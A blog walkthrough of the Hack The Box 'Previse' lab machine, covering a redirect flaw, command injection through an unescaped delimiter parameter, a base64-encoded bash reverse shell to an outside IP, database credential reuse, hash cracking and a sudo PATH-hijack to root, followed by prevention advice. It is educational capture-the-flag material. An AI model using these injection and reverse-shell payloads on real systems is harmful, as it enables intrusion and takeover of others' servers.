---
layout: post
title: Hack The Box Walkthrough - Previse
date: 2022-08-28
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/08/HTB/Previse
img: 2022/08/Previse/Previse.png
---

This is an easy box where you get remote code execution by exploiting a lack of validation and escaping. Then you exploit a bad configured `sudo` script. 

* Room: Previse
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Previse](https://app.hackthebox.com/machines/Previse)
* Author: [m4lwhere](https://app.hackthebox.com/users/107145)

I began by running looking for open ports on the target machine.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
                                                                                                                                                                                                                                           [~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.95.185:22
Open 10.129.95.185:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3
DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports 22 (SSH) and 80 (HTTP) were open.

## Web Site Exploitation

I opened a browser to look at the website. I was redirected to a PHP login page.

![Previse Login Page](/assets/images/2022/08/Previse/PreviseFileStorage.png "Previse Login Page")

I launched Feroxbuster to look for hidden pages.

```bash
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -B -xphp -o ferox.txt -s 200,204,301,302,307,308,401,405

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏦  Collect Backups       │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET       71l      164w     2801c http://target.htb/ => login.php
200      GET       53l      138w     2224c http://target.htb/login.php
302      GET        0l        0w        0c http://target.htb/logout.php => login.php
302      GET      112l      263w     4914c http://target.htb/files.php => login.php
302      GET        0l        0w        0c http://target.htb/logs.php => login.php
200      GET        0l        0w        0c http://target.htb/config.php
200      GET        5l       14w      217c http://target.htb/footer.php
200      GET       20l       64w      980c http://target.htb/header.php
301      GET        9l       28w      306c http://target.htb/css => http://target.htb/css/
302      GET       93l      238w     3994c http://target.htb/accounts.php => login.php
200      GET       31l       60w     1248c http://target.htb/nav.php
302      GET       74l      176w     2966c http://target.htb/status.php => login.php
301      GET        9l       28w      305c http://target.htb/js => http://target.htb/js/
302      GET       71l      164w     2801c http://target.htb/index.php => login.php
302      GET        0l        0w        0c http://target.htb/download.php => login.php
```

It found a few pages that were all redirecting to the login page. The interesting thing was that the pages all had contents, not only a redirection. It looked like the person who wrote the site sent the redirection when the user was not logged in, but they did not stop the script execution after. So the content was returned even if I was not connected.

I used Burp Proxy to look at the HTML that was returned. The `accounts.php` page allowed adding a new account. I used Burp to intercept the response to that page and replace the `302 Found` with `200 OK`.

![Accounts Page](/assets/images/2022/08/Previse/Accounts.png "Accounts Page")

I used the page to create a new account, then I connected to that account.

![Logged In](/assets/images/2022/08/Previse/LoggedIn.png "Logged In")

Once connected, I looked around the site. The `FILES` page allowed uploading files. It also had a backup of the site.

![Files](/assets/images/2022/08/Previse/Files.png "Files")

I downloaded the backup and looked at the code. The file `download.php` had an obvious flaw in it. It allowed downloading the logs of file download, choosing a delimiter.

![Request Log Data](/assets/images/2022/08/Previse/Logs.png "Request Log Data")

The code was calling a Python script to generate the logs, passing it the delimiter. It did not validate the delimiter, and did not escape it before adding it to the command.

```php
/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?>
```

I could clearly get command execution by passing a `;` and the command to run in the delimiter. The code was not sending back the result of the command execution. But it was returning the content of the file `/var/www/out.log`. I just had to redirect my output to that file to see it.

I started by sending a simple command to make sure I could get it executed on the server.

```http
POST /logs.php HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://target.htb
Connection: close
Referer: http://target.htb/file_logs.php
Cookie: PHPSESSID=j0634fsb72q4v9q2rsfjfielij
Upgrade-Insecure-Requests: 1

delim=space;id > /var/www/out.log
```

The response contained the result of running `id`.

```http
HTTP/1.1 200 OK
Date: Sun, 28 Aug 2022 11:33:08 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Description: File Transfer
Content-Disposition: attachment; filename="out.log"
Content-Length: 54
Connection: close
Content-Type: application/octet-stream

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now that I knew I had a command execution, I base64 encoded a command to get a reverse shell.


```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.143/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK
```

I launched netcat listener and sent my command to the server.

```http
POST /logs.php HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://target.htb
Connection: close
Referer: http://target.htb/file_logs.php
Cookie: PHPSESSID=j0634fsb72q4v9q2rsfjfielij
Upgrade-Insecure-Requests: 1

delim=space;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK | base64 -d | bash
```

I got a hit back on the listener and I was on the server.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.95.185 43272
bash: cannot set terminal process group (1540): Inappropriate ioctl for device
bash: no job control in this shell

www-data@previse:/var/www/html$ whoami
whoami
www-data
```

## Lateral Movement

I was connected as `www-data`, and I did not have access to the user flag. I needed to get access to a real user.

The website code had a `config.php` file with database credentials.

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

I connected to the database with those and found a table with more credentials.

```bash
www-data@previse:/var/www/html$ mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 73
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> Show Databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> Show Tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> Select * From accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | admin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2022-08-28 11:10:39 |
+----+----------+------------------------------------+---------------------+
```

The passwords were hashed. I saved them in a file and used hashcat to crack them. The admin's password was mine, but I left it in to make sure hashcat was working well with 🧂 int the salt.

```bash
$ cat hash.txt
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
$1$🧂llol$uXqzPW6SXUONt.AIOBqLy.


$ hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD Ryzen 7 PRO 5850U with Radeon Graphics, 3897/7858 MB (982 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1


Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$🧂llol$uXqzPW6SXUONt.AIOBqLy.:admin
...
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: hash.txt
Time.Started.....: Sun Aug 28 07:45:29 2022 (5 mins, 1 sec)
Time.Estimated...: Sun Aug 28 07:50:30 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:    24630 H/s (7.65ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests
Progress.........: 7413312/14344385 (51.68%)
Rejected.........: 0/7413312 (0.00%)
Restore.Point....: 7413120/14344385 (51.68%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#2....: iloveconnor1 -> ilovecoalcat08
Hardware.Mon.#2..: Util: 98%

Started: Sun Aug 28 07:45:26 2022
Stopped: Sun Aug 28 07:50:31 2022
```

The password was cracked. I used it to connect back to the server as the `m4lwhere` user and read the user flag.

```bash
$ ssh m4lwhere@target
m4lwhere@target's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 28 11:51:48 UTC 2022

  System load:  0.0               Processes:           181
  Usage of /:   50.2% of 4.85GB   Users logged in:     0
  Memory usage: 23%               IP address for eth0: 10.129.95.185
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5

m4lwhere@previse:~$ ls
user.txt

m4lwhere@previse:~$ cat user.txt
REDACTED
```


## Horizontal Escalation

Next, I had to get root on the box. I looked at what the user could run with `sudo`.

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh

m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

I could run a shell script that took a backup of the logs. The script did not use the full path when calling `gzip` and `date`. And the PATH variable was not protected. So I knew that if I changed my path to contain the local folder, I could create a `gzip` file and it would be executed instead of the intended command. 

```bash
m4lwhere@previse:~$ cat gzip
#!/bin/bash

/bin/bash -p 1>&2

m4lwhere@previse:~$ chmod +x gzip

m4lwhere@previse:~$ PATH=.:$PATH sudo /opt/scripts/access_backup.sh

root@previse:/root# cat /root/root.txt
REDACTED
```

## Prevention

The 'errors' in this box are very simple. The script that generated the log file to download should have validated the delimiter that was passed by the user. The script only accepted 3 delimiters. It should have used an allow list and rejected everything else. It should also escape everything it passed to the command line.

The backup script should have used full paths when calling external commands. And `sudo` should be configured to reset the PATH variable by using `env_reset`. And finally, `sudo` permissions were not needed. The script could have been a cron running as root.